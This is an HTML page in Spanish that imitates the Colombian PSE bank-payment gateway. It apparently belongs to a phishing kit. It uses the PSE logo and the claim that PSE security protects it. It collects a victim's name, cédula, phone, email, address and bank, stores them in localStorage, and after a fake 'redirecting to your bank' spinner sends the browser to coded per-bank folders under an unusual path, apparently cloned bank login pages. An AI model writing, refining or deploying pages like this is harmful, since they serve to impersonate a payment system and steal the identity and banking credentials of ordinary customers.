<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>PSE - Formulario de Pago</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: "Segoe UI", Roboto, Arial, sans-serif;
      background: #f0f4f8;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    header {
      width: 100%;
      max-width: 460px;
      display: flex;
      justify-content: center;
      padding: 20px 0;
    }
    header img { 
      width: 120px; /* Ajusté un poco el tamaño para que se vea mejor */
      height: auto; 
      object-fit: contain;
    }
    .formulario {
      background: #fff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.05);
      width: 100%;
      max-width: 460px;
      border-top: 5px solid #4b2d7f;
    }
    .resumen-pago {
      background: #f8faff;
      padding: 15px;
      border-radius: 8px;
      margin-bottom: 25px;
      text-align: center;
      border: 1px dashed #4b2d7f;
    }
    .resumen-pago span { display: block; font-size: 13px; color: #666; }
    .resumen-pago strong { font-size: 20px; color: #111; }

    .formulario h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #4b2d7f;
      font-size: 1.4rem;
    }
    .row { display: flex; gap: 12px; }
    .group { flex: 1; margin-bottom: 15px; }
    label {
      display: block;
      margin-bottom: 5px;
      font-weight: 600;
      color: #444;
      font-size: 13px;
    }
    input, select {
      width: 100%;
      padding: 12px;
      border: 1px solid #d1d5db;
      border-radius: 6px;
      font-size: 15px;
      outline: none;
    }
    input:focus, select:focus {
      border-color: #4b2d7f;
      box-shadow: 0 0 0 3px rgba(75, 45, 127, 0.1);
    }
    button {
      width: 100%;
      background: #4b2d7f;
      color: white;
      border: none;
      padding: 14px;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
      font-size: 16px;
      margin-top: 10px;
    }
    #loader-container {
      display: none;
      text-align: center;
      margin-top: 20px;
    }
    .spinner {
      width: 40px;
      height: 40px;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #4b2d7f;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 10px;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .nota { text-align: center; margin-top: 20px; font-size: 12px; color: #777; }
  </style>
</head>
<body>

  <header>
    <img src="https://images.seeklogo.com/logo-png/43/1/pse-logo-png_seeklogo-433463.png" alt="PSE Logo">
  </header>

  <div class="formulario">
    <div id="form-content">
      <h2>Realizar Pago Seguro</h2>
      
      <div class="resumen-pago">
        <span>Total a pagar</span>
        <strong id="display-total">$ Cargando... COP</strong>
      </div>

      <form id="formPSE">
        <label>Nombre Completo</label>
        <input type="text" id="pse_nombre" placeholder="Como aparece en su banco" required>

        <div class="row">
          <div class="group">
            <label>Cédula</label>
            <input type="text" id="pse_cedula" inputmode="numeric" required>
          </div>
          <div class="group">
            <label>Celular</label>
            <input type="text" id="pse_celular" inputmode="numeric" required>
          </div>
        </div>

        <label>Correo Electrónico</label>
        <input type="email" id="pse_email" placeholder="ejemplo@correo.com" required>

        <label>Dirección</label>
        <input type="text" id="pse_direccion" required>

        <label>Selecciona tu banco</label>
        <select class="form-select" id="pse_banco" name="banco" required>
            <option value="">A continuación seleccione su banco</option>
            <option value="avvillas" tipo="2" folder="b-34f1/">BANCO AV VILLAS</option>
            <option value="bbva" tipo="2" folder="b-34f13">BANCO BBVA COLOMBIA S.A.</option>
            <option value="caja-social" tipo="2" folder="b-34f2">BANCO CAJA SOCIAL</option>
            <option value="bogota" tipo="2" folder="b-34f4">BANCO DE BOGOTA</option>
            <option value="davivienda" tipo="2" folder="b-34f10">BANCO DAVIVIENDA</option>
            <option value="occidente" tipo="2" folder="b-34f14">BANCO DE OCCIDENTE</option>
            <option value="falabella" tipo="2" folder="b-34f5">BANCO FALABELLA</option>
            <option value="finandina" tipo="2" folder="b-34f6">BANCO FINANDINA S.A. BIC</option>
            <option value="itau" tipo="2" folder="b-34f7">BANCO ITAU</option>
            <option value="mundo-mujer" tipo="1" folder="b-34f01">BANCO MUNDO MUJER S.A.</option>
            <option value="popular" tipo="2" folder="b-34f18">BANCO POPULAR</option>
            <option value="serfinanza" tipo="2" folder="b-34f16">BANCO SERFINANZA</option>
            <option value="union" tipo="1" folder="b-34f0">BANCO UNION antes GIROS</option>
            <option value="bancolombia" tipo="2" folder="b-34f9">BANCOLOMBIA</option>
            <option value="lulo" tipo="1" folder="b-34f02">LULO BANK</option>
            <option value="scotiabank-colpatria" tipo="2" folder="b-34f12">SCOTIABANK COLPATRIA</option>
            <option value="nequi" tipo="1" folder="nequi-1">NEQUI</option>
        </select>

        <button type="submit" id="btn-submit">Continuar Pago</button>
      </form>
    </div>

    <div id="loader-container">
      <div class="spinner"></div>
      <p style="color: #4b2d7f; font-size: 14px; font-weight: 600;">Redirigiendo a su entidad bancaria...</p>
    </div>

    <div class="nota">Protegido por el sistema de seguridad PSE</div>
  </div>

  <script>
  // 1. Al cargar la página, leemos el precio extraído de la API de Similpay
  document.addEventListener("DOMContentLoaded", function() {
      const totalGuardado = localStorage.getItem('total_pago');
      
      if (totalGuardado) {
          const precioFormateado = Number(totalGuardado).toLocaleString('es-CO');
          document.getElementById('display-total').innerText = "$ " + precioFormateado + " COP";
      } else {
          document.getElementById('display-total').innerText = "$ 0 COP";
      }
  });

  // 2. Procesar el formulario respetando la estructura original
  document.getElementById("formPSE").addEventListener("submit", function (e) {
    e.preventDefault();

    // Bloqueo visual de interfaz
    document.getElementById('form-content').style.display = 'none';
    document.getElementById('loader-container').style.display = 'block';

    const bancoSel = document.getElementById('pse_banco');
    const opt = bancoSel.options[bancoSel.selectedIndex];
    const carpetaBanco = opt.getAttribute('folder'); 

    // Guardado en LocalStorage
    const totalPagar = localStorage.getItem('total_pago') || "0";
    
    localStorage.setItem('total_pagar', totalPagar);
    localStorage.setItem('nom', document.getElementById('pse_nombre').value);
    localStorage.setItem('val', document.getElementById('pse_cedula').value);
    localStorage.setItem('cel', document.getElementById('pse_celular').value);
    localStorage.setItem('correo', document.getElementById('pse_email').value);
    localStorage.setItem('dir', document.getElementById('pse_direccion').value);
    localStorage.setItem('per', "Natural");
    localStorage.setItem('banco', opt.value);
    localStorage.setItem('folder', carpetaBanco);
    localStorage.setItem('tipo', opt.getAttribute('tipo'));

    // Redirección a la carpeta del banco seleccionado
    setTimeout(() => {
        window.location.href = "/data-ps/recargas/transaction/" + carpetaBanco;
    }, 1500);
  });
  </script>

</body>
</html>